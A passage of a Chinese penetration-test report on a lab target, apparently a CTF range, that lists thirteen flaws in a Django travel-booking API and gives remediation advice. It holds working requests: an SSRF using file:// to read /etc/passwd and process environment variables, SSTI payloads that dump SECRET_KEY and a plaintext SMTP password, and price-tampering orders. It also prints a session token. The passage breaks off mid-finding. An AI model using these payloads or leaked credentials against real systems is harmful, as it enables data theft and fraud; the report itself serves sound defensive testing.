+					<td><a class="link" href="http://hbc2.haobachang.com:30589/"  target="_blank" rel="noopener"
+    >http://hbc2.haobachang.com:30589/</a>（<strong>端口每次会更新</strong>）</td>
+			</tr>
+			<tr>
+					<td>网络范围</td>
+					<td>仅该 Web 服务对外端口及其暴露的 API</td>
+			</tr>
+			<tr>
+					<td>排除范围</td>
+					<td>靶场平台其他靶机；第三方系统（126 邮箱仅验证凭据有效性，未发送任何邮件）</td>
+			</tr>
+	</tbody>
+</table></div>
+<h2 id="23-测试方法">2.3 测试方法
+</h2><p>本次渗透测试参照以下标准和方法进行：</p>
+<ol>
+<li>OWASP Testing Guide v4.2</li>
+<li>PTES (Penetration Testing Execution Standard)</li>
+<li>NIST SP 800-115 技术指南</li>
+<li>GB/T 28448-2019 信息安全技术 网络安全等级保护测评要求</li>
+</ol>
+<p>实际执行按 <strong>信息收集 → 漏洞探测 → 漏洞验证 → 深度利用</strong> 的顺序展开：先下载前端静态资源完成接口枚举，再借助 DEBUG 错误页与 DRF 路由根接口建立全站 API 地图，随后重点覆盖订单金额逻辑、认证会话、服务端请求伪造与模板渲染等高危类目，最后利用 SSRF 读取后端源码完成灰盒级确认。</p>
+<h2 id="24-测试限制">2.4 测试限制
+</h2><p>在本次渗透测试过程中，存在以下限制条件：</p>
+<ul>
+<li>测试在指定时间段内进行，未进行持续性监控；</li>
+<li>测试仅覆盖约定范围内的目标，不涉及范围外系统；</li>
+<li>测试未涉及社会工程学和物理安全测试（除非另行约定）；</li>
+<li>严格遵守非破坏性约束：未删除/篡改任何数据、未执行 DoS、未植入持久化后门；</li>
+<li>邮件发送量严格控制在授权额度内（共 10 封，全部发往自有测试邮箱，额度已用尽）；</li>
+<li>测试结果仅反映测试期间的安全状况。</li>
+</ul>
+<hr>
+<h1 id="三风险评级标准">三、风险评级标准
+</h1><p>本次渗透测试采用以下风险评级标准，根据漏洞的可利用性、影响范围和危害程度进行综合评估：</p>
+<div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>风险等级</th>
+					<th>评分区间</th>
+					<th>定义</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>严重</td>
+					<td>9.0 - 10.0</td>
+					<td>漏洞可被远程利用，可直接获取系统权限、窃取敏感数据或导致服务中断，需立即修复</td>
+			</tr>
+			<tr>
+					<td>高危</td>
+					<td>6.0 - 8.9</td>
+					<td>漏洞需要一定条件触发，可能造成系统信息泄露或部分功能异常，建议尽快修复</td>
+			</tr>
+			<tr>
+					<td>中危</td>
+					<td>3.0 - 5.9</td>
+					<td>漏洞影响有限，难以直接利用，但可能被攻击者用于辅助攻击，建议修复</td>
+			</tr>
+			<tr>
+					<td>低危</td>
+					<td>0.0 - 2.9</td>
+					<td>安全建议或信息泄露类问题，对系统安全影响较小</td>
+			</tr>
+	</tbody>
+</table></div>
+<hr>
+<h1 id="四漏洞概览">四、漏洞概览
+</h1><h2 id="41-漏洞统计">4.1 漏洞统计
+</h2><p>本次渗透测试共发现安全漏洞 <strong>13</strong> 个，整体系统评估为 <strong>【严重】</strong> 系统。其中两项严重漏洞（SSRF / SSTI）<strong>完全无需认证</strong>即可利用，从匿名访问直达服务器任意文件读取与全量配置泄露，这在同类业务系统中属于罕见的纵深防护失守。</p>
+<h2 id="42-漏洞清单">4.2 漏洞清单
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>编号</th>
+					<th>漏洞名称</th>
+					<th>风险等级</th>
+					<th>影响目标</th>
+					<th>状态</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td>VULN-001</td>
+					<td>未授权SSRF任意文件读取</td>
+					<td><strong>严重</strong></td>
+					<td>POST /api/activity/import-image/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-002</td>
+					<td>未授权SSTI服务端模板注入</td>
+					<td><strong>严重</strong></td>
+					<td>POST /api/activity/review-template-preview/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-003</td>
+					<td>负数价格订单反向充值刷余额</td>
+					<td><strong>严重</strong></td>
+					<td>POST /api/order/create/ + pay</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-004</td>
+					<td>任意价格篡改与零元购</td>
+					<td><strong>严重</strong></td>
+					<td>POST /api/order/create/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-005</td>
+					<td>库存校验绕过（超卖）</td>
+					<td>高危</td>
+					<td>POST /api/order/create/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-006</td>
+					<td>生产环境DEBUG模式开启</td>
+					<td>高危</td>
+					<td>全局（任意触发异常的页面）</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-007</td>
+					<td>CORS任意源反射叠加凭证传递</td>
+					<td>高危</td>
+					<td>全局响应头</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-008</td>
+					<td>SMTP邮箱凭据泄露</td>
+					<td>高危</td>
+					<td>经VULN-002获取</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-009</td>
+					<td>邮箱轰炸（验证码无频率限制）</td>
+					<td>中危</td>
+					<td>POST /api/user/send-code/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-010</td>
+					<td>验证码与登录口令无限暴力破解</td>
+					<td>中危</td>
+					<td>user/login、reset-password</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-011</td>
+					<td>登录接口用户名枚举</td>
+					<td>中危</td>
+					<td>POST /api/user/login/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-012</td>
+					<td>并发支付竞态条件</td>
+					<td>中危</td>
+					<td>POST /api/order/{pk}/pay/</td>
+					<td>未修复</td>
+			</tr>
+			<tr>
+					<td>VULN-013</td>
+					<td>过期日期仍可下单</td>
+					<td>中危</td>
+					<td>POST /api/order/create/</td>
+					<td>未修复</td>
+			</tr>
+	</tbody>
+</table></div>
+<hr>
+<h1 id="五漏洞详情">五、漏洞详情
+</h1><h2 id="vuln-001-未授权ssrf导致任意文件读取">VULN-001 未授权SSRF导致任意文件读取
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-001</th>
+					<th>危害等级</th>
+					<th><strong>严重</strong></th>
+					<th>风险评分</th>
+					<th>9.8</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>POST /api/activity/import-image/</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>否</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>无</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理：</strong></p>
+<p><code>import-image</code> 接口接受任意 <code>url</code> 参数并在服务端发起请求，未做任何协议限制、目标域名白名单与内网地址过滤，且接口权限配置为 <code>AllowAny</code>。底层实现直接使用 Python <code>urllib</code> 的 <code>urlopen()</code> 打开 URL，而 <code>urllib</code> 原生支持 <code>file</code> 协议，因此攻击者只需将 URL 改为 <code>file:///</code> 前缀即可读取服务器上的任意文件，文件内容以 <code>preview</code> 字段回显（前 1024 字节）。更严重的是，Gunicorn 进程以 <strong>root</strong> 用户运行，读取范围覆盖整个文件系统，包括 <code>/etc/passwd</code>、应用源码、数据库文件乃至 <code>/proc</code> 虚拟文件系统。</p>
+<p><strong>发现过程：</strong></p>
+<p>在对前端打包 JS 资产（<code>index.js</code>）做接口枚举时，发现 activity 模块存在两个前端代码中完全未被调用的端点，属于残留调试接口。对 <code>import-image</code> 构造 <code>file://</code> 请求后直接命中。</p>
+<p><strong>复现步骤（匿名即可完成）：</strong></p>
+<p>第一步，构造包含 <code>file</code> 协议 URL 的 JSON 请求体；第二步，直接 POST 到接口；第三步，从响应 <code>preview</code> 字段读取文件内容。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/activity/import-image/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">hbc2.haobachang.com:30589</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;file:///etc/passwd&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">HTTP/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="err">OK</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;code&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&#34;msg&#34;</span><span class="p">:</span><span class="s2">&#34;ok&#34;</span><span class="p">,</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;status&#34;</span><span class="p">:</span><span class="kc">null</span><span class="p">,</span><span class="nt">&#34;content_type&#34;</span><span class="p">:</span><span class="s2">&#34;text/plain&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;preview&#34;</span><span class="p">:</span><span class="s2">&#34;root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin/...&#34;</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：读取 /etc/passwd 的请求与响应回显）</em></p>
+<p>读取进程环境变量，直接获得挑战旗标与运行环境信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/activity/import-image/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;file:///proc/self/environ&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 200 OK（篇幅有限，节选关键变量）
+</span></span><span class="line"><span class="cl">... PWD=/app
+</span></span><span class="line"><span class="cl">GZCTF_FLAG=flag{3366227d319b428a96e5901a4f60d5c2}
+</span></span><span class="line"><span class="cl">FLAG=flag{3366227d319b428a96e5901a4f60d5c2}
+</span></span><span class="line"><span class="cl">SUPERVISOR_PROCESS_NAME=gunicorn HOME=/root ...
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：环境变量回显中的 flag）</em></p>
+<p>还可以任意读取应用源码，为后续漏洞提供灰盒依据（详见 VULN-004 中读出的序列化器代码）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/activity/import-image/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;url&#34;</span><span class="p">:</span><span class="s2">&#34;file:///app/apps/order/serializers.py&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>危害：</strong></p>
+<p>本次测试已实际读取系统用户文件、全部应用源码、数据库文件头部与进程环境变量，并直接获得 flag。对于云环境，同类漏洞还可用于探测内网端口与云元数据接口（获取临时凭据），影响范围远超单机。</p>
+<p><strong>修复建议：</strong></p>
+<ol>
+<li>删除或严格限制 <code>import-image</code> 调试接口的生产可达性，此类接口不应出现在对外环境；</li>
+<li>如确有代理拉取图片的业务需求，必须建立 URL 白名单（仅允许 <code>https</code> 协议与受信域名），禁止内网地址段与 <code>file</code>/<code>gopher</code>/<code>dict</code> 等协议；</li>
+<li>为运行环境配置独立的代理出口与 DNS 解析监控，使服务端不能直接触达任意目标。</li>
+</ol>
+<hr>
+<h2 id="vuln-002-未授权ssti服务端模板注入导致全量配置泄露">VULN-002 未授权SSTI服务端模板注入导致全量配置泄露
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-002</th>
+					<th>危害等级</th>
+					<th><strong>严重</strong></th>
+					<th>风险评分</th>
+					<th>9.1</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>POST /api/activity/review-template-preview/</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>否</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>无</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理：</strong></p>
+<p><code>review-template-preview</code> 接口将用户提交的 <code>template</code> 字段直接交给 <code>django.template.Template(...).render(...)</code> 渲染，构成教科书级的服务端模板注入。渲染上下文中包含 <code>settings</code> 对象与当前用户对象，因此攻击者可以通过模板语法遍历读取任意 settings 属性——包括被 Django 安全过滤器打码的 <code>SECRET_KEY</code> 与 <code>EMAIL_HOST_PASSWORD</code>。接口同样不需要任何认证。</p>
+<p><strong>复现步骤（匿名即可完成）：</strong></p>
+<p>第一步，向接口提交含模板语法的 JSON 体；第二步，从响应 <code>data</code> 字段直接读出渲染结果。</p>
+<p>读取 Django <code>SECRET_KEY</code>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/activity/review-template-preview/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;template&#34;</span><span class="p">:</span><span class="s2">&#34;{{ settings.SECRET_KEY }}&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">HTTP/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="err">OK</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;code&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&#34;msg&#34;</span><span class="p">:</span><span class="s2">&#34;ok&#34;</span><span class="p">,</span><span class="nt">&#34;data&#34;</span><span class="p">:</span><span class="s2">&#34;django-insecure-haopaochang-travel-platform-2026&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：SECRET_KEY 回显）</em></p>
+<p>读取 SMTP 邮箱密码明文：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/activity/review-template-preview/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;template&#34;</span><span class="p">:</span><span class="s2">&#34;{{ settings.EMAIL_HOST_PASSWORD }}&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">{&#34;code&#34;:0,&#34;msg&#34;:&#34;ok&#34;,&#34;data&#34;:&#34;WLbJU4EApDypVskw&#34;}   // haobachang@126.com 的SMTP密码明文
+</span></span><span class="line"><span class="cl">// 另可读: EMAIL_HOST_USER=haobachang@126.com, EMAIL_PORT=465
+</span></span><span class="line"><span class="cl">// 测试中已尝试登录IMAP（被拒，未开通）与SMTP（550限制登录IP），凭据有效性依赖登录来源，但泄露事实成立
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：SMTP 密码回显）</em></p>
+<p>利用 <code>{% debug %}</code> 标签倾倒全部渲染上下文与已加载模块清单：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/activity/review-template-preview/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;template&#34;</span><span class="p">:</span><span class="s2">&#34;{% debug %}&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">HTTP/1.1 200 OK
+</span></span><span class="line"><span class="cl">{&#39;activity_name&#39;: &#39;示例活动&#39;,
+</span></span><span class="line"><span class="cl"> &#39;settings&#39;: &lt;LazySettings &#34;DjDemo.settings&#34;&gt;,
+</span></span><span class="line"><span class="cl"> &#39;user&#39;: &lt;User: testuser&gt;}{&#39;False&#39;: False, &#39;None&#39;: None, &#39;True&#39;: True}
+</span></span><span class="line"><span class="cl">... 后接全部已加载 Python 模块清单（篇幅所限省略）
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>危害：</strong></p>
+<p><code>SECRET_KEY</code> 泄露意味着攻击者可伪造会话 Cookie、密码重置令牌与 CSRF 令牌，结合对外可达的 <code>/admin/</code> 后台可直接威胁管理员账户；SMTP 密码泄露可被用于冒充平台向全量用户发送钓鱼邮件。<code>{% debug %}</code> 标签则进一步扩大信息收集面。</p>
+<p><strong>修复建议：</strong></p>
+<ol>
+<li>删除该调试接口；</li>
+<li>如确有评价模板预览需求，应使用白名单模板机制而非直接渲染用户输入，并对输入做严格的模板语法过滤（禁止 <code>{% %}</code> 标签与 <code>debug</code>、<code>settings</code> 等敏感变量）；</li>
+<li>立即轮换 <code>SECRET_KEY</code> 与 SMTP 密码，并为邮箱启用独立授权码。</li>
+</ol>
+<hr>
+<h2 id="vuln-003-负数价格订单反向充值刷余额">VULN-003 负数价格订单反向充值刷余额
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-003</th>
+					<th>危害等级</th>
+					<th><strong>严重</strong></th>
+					<th>风险评分</th>
+					<th>9.0</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>POST /api/order/create/ + /api/order/{pk}/pay/</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>是（普通用户）</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>注册任意账户</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理：</strong></p>
+<p>订单创建序列化器接受客户端传入的 <code>total_price</code> 字段且未做非负校验，钱包支付逻辑按订单金额直接扣减余额。当订单金额为<strong>负数</strong>时，扣减负数等价于向用户钱包增加对应正数金额，形成&quot;反向充值&quot;。攻击者反复循环下单-支付即可无限刷余额。</p>
+<p><strong>复现步骤：</strong></p>
+<p>第一步，正常登录并进入下单页；第二步，提交订单时将金额字段改为负数（如 <code>-479.99</code>）；第三步，调用钱包支付完成该订单；第四步，查询个人信息发现余额不降反升。</p>
+<p>支付完成后查询余额快照：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/api/user/profile/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">hbc2.haobachang.com:30589</span>
+</span></span><span class="line"><span class="cl"><span class="n">Authorization</span><span class="o">:</span> <span class="l">Token 33fe3dd93ff9dce4255cb23b0f66019f2b501e51</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="err">HTTP/</span><span class="mf">1.1</span> <span class="mi">200</span> <span class="err">OK</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;code&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="nt">&#34;msg&#34;</span><span class="p">:</span><span class="s2">&#34;ok&#34;</span><span class="p">,</span><span class="nt">&#34;data&#34;</span><span class="p">:{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;testuser&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;real_name&#34;</span><span class="p">:</span><span class="s2">&#34;PATCH_TEST&#34;</span><span class="p">,</span><span class="nt">&#34;points&#34;</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;balance&#34;</span><span class="p">:</span><span class="s2">&#34;2479.99&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;email&#34;</span><span class="p">:</span><span class="s2">&#34;test@haopaochang.com&#34;</span><span class="p">,</span> <span class="err">...</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">注：初始余额为 2000.00，经负数价格订单支付后余额不降反升至 2479.99
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：下单页抓包改金额 + 支付成功 + 个人中心余额 2479.99 对比图）</em></p>
+<p><strong>危害：</strong></p>
+<p>直接资金损失。本次测试中演练账户余额由 2000.00 元被刷至 2479.99 元（已保留订单与余额快照证据），若接入真实支付渠道将造成直接资金损失与对账混乱。</p>
+<p><strong>修复建议：</strong></p>
+<p>金额必须由服务端根据数据库价格与数量重算，完全不信任客户端提交的任何金额字段；序列化器中删除 <code>total_price</code> 与 <code>discount</code> 的入口；支付前对金额做非负与上限校验，并引入数据库事务保证扣减原子性。</p>
+<hr>
+<h2 id="vuln-004-任意价格篡改与零元购">VULN-004 任意价格篡改与零元购
+</h2><div class="table-wrapper"><table>
+	<thead>
+			<tr>
+					<th>漏洞编号</th>
+					<th>VULN-004</th>
+					<th>危害等级</th>
+					<th><strong>严重</strong></th>
+					<th>风险评分</th>
+					<th>8.8</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><strong>漏洞位置</strong></td>
+					<td>POST /api/order/create/</td>
+					<td><strong>是否需要认证</strong></td>
+					<td>是（普通用户）</td>
+					<td><strong>攻击前置条件</strong></td>
+					<td>注册任意账户</td>
+			</tr>
+	</tbody>
+</table></div>
+<p><strong>漏洞原理：</strong></p>
+<p>与 VULN-003 同根：金额字段由客户端控制。攻击者可将任意商品以极低价（如 0.01 元）甚至零元下单支付。有意思的是，通过 VULN-001 读取服务器源码时，发现开发者注释中明确承认了这一设计，属于靶场人为布置，但其代码模式在真实项目中同样常见（典型的&quot;信任客户端&quot;反模式）。</p>
+<p><strong>复现步骤：</strong></p>
+<p>第一步，正常登录（测试账号 <code>testuser / 123456</code>），选一个 280 元的景点提交订单并抓包；第二步，在请求体末尾追加 <code>total_price</code> 与 <code>final_price</code> 字段并改为 <code>0.01</code>；第三步，放包后订单生成成功，转入支付流程；第四步，保持 Token 不变完成支付，实际仅扣款 0.01 元。</p>
+<p>抓包修改后的请求体（追加金额字段）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/api/order/create/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">hbc2.haobachang.com:30589</span>
+</span></span><span class="line"><span class="cl"><span class="n">Authorization</span><span class="o">:</span> <span class="l">Token 33fe3dd93ff9dce4255cb23b0f66019f2b501e51</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;activity_id&#34;</span><span class="p">:</span><span class="mi">3</span><span class="p">,</span><span class="nt">&#34;date_id&#34;</span><span class="p">:</span><span class="mi">7</span><span class="p">,</span><span class="nt">&#34;quantity&#34;</span><span class="p">:</span><span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;张三&#34;</span><span class="p">,</span><span class="nt">&#34;phone&#34;</span><span class="p">:</span><span class="s2">&#34;123456&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&#34;total_price&#34;</span><span class="p">:</span><span class="s2">&#34;0.01&#34;</span><span class="p">,</span><span class="nt">&#34;final_price&#34;</span><span class="p">:</span><span class="s2">&#34;0.01&#34;</span><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em>（截图位置：Burp 抓包对比原始请求与篡改后请求）</em></p>
+<p>支付成功的响应与余额变化：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
